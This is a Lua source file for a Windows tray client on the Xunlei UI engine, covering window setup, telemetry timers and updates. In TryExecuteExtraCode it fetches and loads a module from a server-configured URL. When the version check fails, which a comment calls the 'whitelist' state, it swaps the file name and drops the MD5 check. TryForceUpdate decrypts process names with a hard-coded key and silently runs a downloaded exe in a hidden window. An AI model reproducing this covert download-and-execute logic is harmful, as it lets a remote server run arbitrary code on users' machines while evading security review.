		local tUserConfig = ReadConfigFromMemByKey("tUserConfig") or {}
		local bRet = rootctrl:SetTipData(tUserConfig)			
		if not bRet then
			return false
		end
	
		return true
	end
	
	PopTipWnd(OnCreateFuncF)	
end


function CreatePopupTipWnd()
	for key, tItem in pairs(g_tPopupWndList) do
		local strHostWndName = tItem[1]
		local strTreeName = tItem[2]
		local bSucc = CreateWndByName(strHostWndName, strTreeName)
		
		if not bSucc then
			TipLog("[CreatePopupTipWnd] create wnd failed: "..tostring(strHostWndName))
			local FunctionObj = XLGetGlobal("Global.FunctionHelper")
			FunctionObj:FailExitTipWnd(5)
			return false
		end
	end
	
	return true
end


function CreateWndByName(strHostWndName, strTreeName)
	local bSuccess = false
	local strInstWndName = strHostWndName..".Instance"
	local strInstTreeName = strTreeName..".Instance"
	
	local templateMananger = XLGetObject("Xunlei.UIEngine.TemplateManager")
	local frameHostWndTemplate = templateMananger:GetTemplate(strHostWndName, "HostWndTemplate" )
	if frameHostWndTemplate then
		local frameHostWnd = frameHostWndTemplate:CreateInstance(strInstWndName)
		if frameHostWnd then
			local objectTreeTemplate = nil
			objectTreeTemplate = templateMananger:GetTemplate(strTreeName, "ObjectTreeTemplate")
			if objectTreeTemplate then
				local uiObjectTree = objectTreeTemplate:CreateInstance(strInstTreeName)
				if uiObjectTree then
					frameHostWnd:BindUIObjectTree(uiObjectTree)
					local iRet = frameHostWnd:Create()
					if iRet ~= nil and iRet ~= 0 then
						bSuccess = true
					end
				end
			end
		end
	end

	return bSuccess
end

function SaveConfigInTimer()
	local nTimeSpanInMs = 10 * 60 * 1000
	local timerManager = XLGetObject("Xunlei.UIEngine.TimerManager")
	timerManager:SetTimer(function(item, id)
		SaveAllConfig()
	end, nTimeSpanInMs)
end


function SendClientReport(nOPeration)
	-- local strCID = GetPeerID()
	-- local strChannelID = GetInstallSrc()
	-- local strVer = GetGSMinorVer()
	-- local strRandom = tipUtil:GetCurrentUTCTime()
	
	-- local strPort = "8082"
	-- if nOPeration == 10 then   --心跳上报的端口为8083
		-- strPort = "8083"
	-- end
	
	-- local strUrl = "http://stat.lvdun123.com:"..tostring(strPort).."/c?appid=1001&peerid=".. tostring(strCID)
					-- .."&proid=11&op="..tostring(nOPeration).."&cid="..(strChannelID)
					-- .."&ver="..tostring(strVer).."&rd="..tostring(strRandom)
	
	-- TipLog("SendClientReport: " .. tostring(strUrl))
	-- tipAsynUtil:AsynSendHttpStat(strUrl, function() end)
end


function StartRunCountTimer()
	local nTimeSpanInSec = 10 * 60 
	local nTimeSpanInMs = nTimeSpanInSec * 1000
	local timerManager = XLGetObject("Xunlei.UIEngine.TimerManager")
	timerManager:SetTimer(function(item, id)
		gnLastReportRunTmUTC = tipUtil:GetCurrentUTCTime()
		SendRunTimeReport(nTimeSpanInSec, false)
	end, nTimeSpanInMs)
	
	local nTimeSpanInMs = 2*60*1000
	timerManager:SetTimer(function(item, id)
		SendHeartReport(10)
	end, nTimeSpanInMs)
end


function GetCommandStrValue(strKey)
	local bRet, strValue = false, nil
	local cmdString = tipUtil:GetCommandLine()
	
	if string.find(cmdString, strKey .. " ") then
		local cmdList = tipUtil:CommandLineToList(cmdString)
		if cmdList ~= nil then	
			for i = 1, #cmdList, 1 do
				local strTmp = tostring(cmdList[i])
				if strTmp == strKey 
					and not string.find(tostring(cmdList[i + 1]), "^/") then		
					bRet = true
					strValue = tostring(cmdList[i + 1])
					break
				end
			end
		end
	end
	return bRet, strValue
end


function SendStartupReport(bShowWnd)
	local tStatInfo = {}
	
	local bRet, strSource = GetCommandStrValue("/sstartfrom")
	tStatInfo.strEL = strSource or ""
	
	if not bShowWnd then
		tStatInfo.strEC = "startup"  --进入上报
		tStatInfo.strEA = GetGSMinorVer() or ""
	else
		tStatInfo.strEC = "showui" 	 --展示上报
		tStatInfo.strEA = GetInstallSrc() or ""
	end
	
	tStatInfo.strEV = 1
	local FunctionObj = XLGetGlobal("Global.FunctionHelper")
	FunctionObj.TipConvStatistic(tStatInfo)
end


function SendClientStartReport()
	SendClientReport(2)
end


function ReportAndExit()
	DestroyMainWnd()
	DestroyPopupWnd()
	HideTray()
	
	local FunctionObj = XLGetGlobal("Global.FunctionHelper")
	local tStatInfo = {}
			
	SendClientReport(10)
	SendRunTimeReport(0, true)
	
	tStatInfo.strEC = "exit"	
	tStatInfo.strEA = GetInstallSrc() or ""
	tStatInfo.Exit = true
			
	FunctionObj.TipConvStatistic(tStatInfo)
end


function SendRunTimeReport(nTimeSpanInSec, bExit)
	local FunctionObj = XLGetGlobal("Global.FunctionHelper")
	local tStatInfo = {}
	tStatInfo.strEC = "runtime"
	tStatInfo.strEA = GetInstallSrc() or ""
	
	local nRunTime = 0
	if bExit and gnLastReportRunTmUTC ~= 0 then
		nRunTime = math.abs(tipUtil:GetCurrentUTCTime() - gnLastReportRunTmUTC)
	else
		nRunTime = nTimeSpanInSec
	end
	tStatInfo.strEV = nRunTime
	
	FunctionObj.TipConvStatistic(tStatInfo)
end

function CheckForceVersion(tForceVersion)
	if type(tForceVersion) ~= "table" then
		return false
	end

	local bRightVer = false
	
	local strCurVersion = GetGSVersion()
	local _, _, _, _, _, strCurVersion_4 = string.find(strCurVersion, "(%d+)%.(%d+)%.(%d+)%.(%d+)")
	local nCurVersion_4 = tonumber(strCurVersion_4)
	if type(nCurVersion_4) ~= "number" then
		return bRightVer
	end
	for iIndex = 1, #tForceVersion do
		local strRange = tForceVersion[iIndex]
		local iPos = string.find(strRange, "-")
		if iPos ~= nil then
			local lVer = tonumber(string.sub(strRange, 1, iPos - 1))
			local hVer = tonumber(string.sub(strRange, iPos + 1))
			if lVer ~= nil and hVer ~= nil and nCurVersion_4 >= lVer and nCurVersion_4 <= hVer then
				bRightVer = true
				break
			end
		else
			local verFlag = tonumber(strRange)
			if verFlag ~= nil and nCurVersion_4 == verFlag then
				bRightVer = true
				break
			end
		end
	end
	
	return bRightVer
end


function DownLoadNewVersion(tNewVersionInfo, fnCallBack)
	local strPacketURL = tNewVersionInfo.strPacketURL
	local strMD5 = tNewVersionInfo.strMD5
	if not IsRealString(strPacketURL) then
		return
	end
	
	local strFileName = GetFileSaveNameFromUrl(strPacketURL)
	if not string.find(strFileName, "%.exe$") then
		strFileName = strFileName..".exe"
	end
	local strSaveDir = tipUtil:GetSystemTempPath()
	local strSavePath = tipUtil:PathCombine(strSaveDir, strFileName)
	
	local strStamp = GetTimeStamp()
	local strURLFix = strPacketURL..strStamp
	
	DownLoadFileWithCheck(strURLFix, strSavePath, strMD5
	, function(bRet, strRealPath)
		TipLog("[DownLoadNewVersion] strOpenLink:"..tostring(strPacketURL)
		        .."  bRet:"..tostring(bRet).."  strRealPath:"..tostring(strRealPath))
				
		if 0 == bRet then
			fnCallBack(strRealPath, tNewVersionInfo)
			return
		end
		
		if 1 == bRet then	--安装包已经存在
			fnCallBack(strSavePath, tNewVersionInfo)
			return
		end
	end)	
end


function CheckCommonUpdateTime(nTimeInDay)
	return CheckUpdateTimeSpan(nTimeInDay, "nLastCommonUpdateUTC")
end

function CheckAutoUpdateTime(nTimeInDay)
	return CheckUpdateTimeSpan(nTimeInDay, "nLastAutoUpdateUTC")
end

function CheckUpdateTimeSpan(nTimeInDay, strUpdateType)
	if type(nTimeInDay) ~= "number" then
		return false
	end
	
	local nTimeInSec = nTimeInDay*24*3600
	local nCurTimeUTC = tipUtil:GetCurrentUTCTime()
	local tUserConfig = ReadConfigFromMemByKey("tUserConfig") or {}
	local nLastUpdateUTC = tUserConfig[strUpdateType] or 0
	local nTimeSpan = math.abs(nCurTimeUTC - nLastUpdateUTC)
	
	if nTimeSpan > nTimeInSec then
		return true
	end	
	
	return false
end


function SaveCommonUpdateUTC()
	local tUserConfig = ReadConfigFromMemByKey("tUserConfig") or {}
	tUserConfig["nLastCommonUpdateUTC"] = tipUtil:GetCurrentUTCTime()
	SaveConfigToFileByKey("tUserConfig")
end


function SaveAutoUpdateUTC()
	local tUserConfig = ReadConfigFromMemByKey("tUserConfig") or {}
	tUserConfig["nLastAutoUpdateUTC"] = tipUtil:GetCurrentUTCTime()
	SaveConfigToFileByKey("tUserConfig")
end

function CheckCondition(tForceUpdate)
	if not tForceUpdate or #tForceUpdate < 1 then
		Helper:LOG("tForceUpdate is nil or wrong style!")
		-- XLMessageBox("tForceUpdate is nil or wrong style!")
		return
	end
	local strEncryptKey = "Qaamr2Npau6jGy4Q"
	local function CheckConditionEx(pcond)
		if not pcond or #pcond < 1 then
			Helper:LOG("pcond is nil or wrong style!")
			return false
		end
		for index=1, #pcond do
			--解密进程名
			local realProcName = tipUtil:DecryptString(pcond[index], strEncryptKey)
			Helper:LOG("realProcName: "..tostring(realProcName))
				
			--检测进程是否存在
			if realProcName and realProcName ~= "" then
				if not tipUtil:QueryProcessExists(realProcName) then
					Helper:LOG("QueryProcessExists false realProcName: "..tostring(realProcName))
					return false
				end
			else
				return false
			end
		end
		--pcond里配的进程都存在
		return true
	end
	
	for i=1, #tForceUpdate do
		local pcond = tForceUpdate[i] and tForceUpdate[i].pcond
		if not pcond or "" == pcond[1] then
			return tForceUpdate[i]
		elseif CheckConditionEx(pcond) then
			return tForceUpdate[i]
		end
	end
	
	return nil
end
--旧tForceUpdate结构：
-- ["strVersion"] = "1.0.0.17",
-- ["tVersion"] = {"1-15"},
--...
--新tForceUpdate结构：
-- {
	-- [1] = {
		-- ["strVersion"]=...
		-- ["tVersion"] =...
		-- ["pcond"] = {"360se.exe", "QQ.exe"}
	-- }
-- }
function TryForceUpdate(tServerConfig)
	if CheckIsUpdating() then
		TipLog("[TryForceUpdate] CheckIsUpdating failed,another thread is updating!")
		return
	end

	local bPassCheck = CheckCommonUpdateTime(1)
	if not bPassCheck then
		TipLog("[TryForceUpdate] CheckCommonUpdateTime failed")
		return		
	end

	local tNewVersionInfo = tServerConfig["tNewVersionInfo"] or {}
	local tForceUpdate = tNewVersionInfo["tForceUpdate"]
	if(type(tForceUpdate)) ~= "table" then
		return 
	end
	
	local strCurVersion = GetGSVersion()
	local versionInfo = CheckCondition(tForceUpdate)
	local strNewVersion = versionInfo and versionInfo.strVersion		
	if not IsRealString(strCurVersion) or not IsRealString(strNewVersion)
		or not CheckIsNewVersion(strNewVersion, strCurVersion) then
		TipLog("[TryForceUpdate] strCurVersion is nil or is not New Version")
		return
	end
	
	local tVersionLimit = versionInfo["tVersion"]
	local bPassCheck = CheckForceVersion(tVersionLimit)
	TipLog("[TryForceUpdate] CheckForceVersion bPassCheck:"..tostring(bPassCheck))
	if not bPassCheck then
		return 
	end
	
	SetIsUpdating(true)
	DownLoadNewVersion(versionInfo, function(strRealPath) 
		SetIsUpdating(false)
	
		if not IsRealString(strRealPath) then
			return
		end
		
		SaveCommonUpdateUTC()
		local strCmd = " /write /silent /run"
		if IsRealString(versionInfo["strCmd"]) then
			strCmd = strCmd.." "..versionInfo["strCmd"]
		end
		tipUtil:ShellExecute(0, "open", strRealPath, strCmd, 0, "SW_HIDE")
	end)
end

function TryExecuteExtraCode(tServerConfig)
	local tExtraHelper = tServerConfig["tExtraHelper"] or {}
	local strURL = tExtraHelper["strURL"]
	local strMD5 = tExtraHelper["strMD5"]
	
	if not IsRealString(strURL) then
		return
	end
	
	local bPassCheck = CheckForceVersion(tExtraHelper["tVersion"])
	TipLog("[TryExecuteExtraCode] CheckForceVersion bPassCheck:"..tostring(bPassCheck))
	if not bPassCheck then --不满足外网版本则是过白状态, 文件名换成v1.0的
		strURL = string.gsub(strURL, "_v%d%.%d+", "_v1%.0")
		TipLog("TryExecuteExtraCode, bPassCheck = "..tostring(bPassCheck)..", strURL = "..tostring(strURL))
		strMD5 = ""
	end
	
	
	local strHelperName = GetFileSaveNameFromUrl(strURL)
	local strSaveDir = tipUtil:GetSystemTempPath()
	local strSavePath = tipUtil:PathCombine(strSaveDir, strHelperName)
	
	local strStamp = GetTimeStamp()
	local strURLFix = strURL..strStamp
	
	DownLoadFileWithCheck(strURLFix, strSavePath, strMD5
	, function(bRet, strRealPath)
		TipLog("[TryExecuteExtraCode] strURL:"..tostring(strURL)
		        .."  bRet:"..tostring(bRet).."  strRealPath:"..tostring(strRealPath))
				
		if bRet < 0 then
			return
		end
		
		TipLog("[TryExecuteExtraCode] begin execute extra helper: "..tostring(strRealPath))
		XLLoadModule(strRealPath)
	end)	
end


function WriteLastLaunchTime()
	local nCurrnetTime = tipUtil:GetCurrentUTCTime()
	local strRegPath = "HKEY_CURRENT_USER\\SOFTWARE\\gxzb\\LastLaunchTime"
	RegSetValue(strRegPath, nCurrnetTime)
end

function AnalyzeServerConfig(nDownServer, strServerPath)
	if nDownServer ~= 0 or not tipUtil:QueryFileExists(tostring(strServerPath)) then
		TipLog("[AnalyzeServerConfig] Download server config failed , start tipmain ")
		TipMain()
		return	
	end
	
	local tServerConfig = LoadTableFromFile(strServerPath) or {}
	g_ServerConfig = tServerConfig	
	TryExecuteExtraCode(tServerConfig)
	
	TipMain()
	--增加处理/noliveup命令行
	SetOnceTimer(function()
					local cmdString = tipUtil:GetCommandLine()
					local bRet = string.find(string.lower(tostring(cmdString)), "/noliveup")
					if not bRet then
						TipLog("[AnalyzeServerConfig] TryForceUpdate")
						TryForceUpdate(tServerConfig)
					else
						TipLog("[AnalyzeServerConfig] bRet")
					end
				end, 1000)
end


function TryShowNonSysBubble(strCmd)
	if string.find(tostring(strCmd), "/showbubble") then
		ShowPopupWndByName("TipBubbleWnd.Instance", true)
	end
end

function TryShowSysBootRemind(strCmd)
	if string.find(tostring(strCmd), "/showsysboot") then
		ShowPopupWndByName("TipSysbootWnd.Instance", true)
	end
end


function TryShowIntroduceWnd(strCmd)
	if not string.find(tostring(strCmd), "/showintroduce") then
		return
	end

	ShowIntroduceOnce()
end


function ShowIntroduceOnce()
	local tUserConfig = ReadConfigFromMemByKey("tUserConfig") or {}
	local nLastShowIntroduce = FetchValueByPath(tUserConfig, {"nLastShowIntroduce"})
	local strRegPath = "HKEY_CURRENT_USER\\SOFTWARE\\GreenShield\\ShowIntroduce"
	
	if not IsNilString(nLastShowIntroduce) then
		RegDeleteValue(strRegPath)
		return
	end
	
	local strValue = RegQueryValue(strRegPath)
	if IsRealString(strValue) then
		ShowPopupWndByName("TipIntroduceWnd.Instance", true)
		tUserConfig["nLastShowIntroduce"] = tipUtil:GetCurrentUTCTime()
		SaveConfigToFileByKey("tUserConfig")
	end
	
	RegDeleteValue(strRegPath)
end


function LoadJSONHelper()
	local strJSONHelperPath = __document.."\\..\\JSON.lua"
	local Module = XLLoadModule(strJSONHelperPath)
end


function LoadUIHelper()
	local strUIHelperPath = __document.."\\..\\uihelper.lua"
	local Module = XLLoadModule(strUIHelperPath)
end

function LoadDynamicFont()
	local strFontPath = __document.."\\..\\dynamicfont.lua"
	local Module = XLLoadModule(strFontPath)
end


function ShowPopWndByCommand()
	local cmdString = tipUtil:GetCommandLine()
	TryShowNonSysBubble(cmdString)
	TryShowIntroduceWnd(cmdString)
	TryShowSysBootRemind(cmdString)
end

function TipMain()	
	
	CreateMainTipWnd()
	CreatePopupTipWnd()
	SaveConfigInTimer()
	
	ShowPopWndByCommand()
end


function PreTipMain() 
	gnLastReportRunTmUTC = tipUtil:GetCurrentUTCTime()
	
	RegisterFunctionObject()
	LoadDynamicFont()
	LoadJSONHelper()
	LoadUIHelper()
	
	StartRunCountTimer()
	SendClientStartReport()
	SendStartupReport(false)

	local bSuccess = ReadAllConfigInfo()	
	if false then
		MessageBox(tostring("文件被损坏，请重新安装"))
		local FunctionObj = XLGetGlobal("Global.FunctionHelper")
		FunctionObj:FailExitTipWnd(1)
		return
	end

	DownLoadServerConfig(AnalyzeServerConfig)
end

PreTipMain()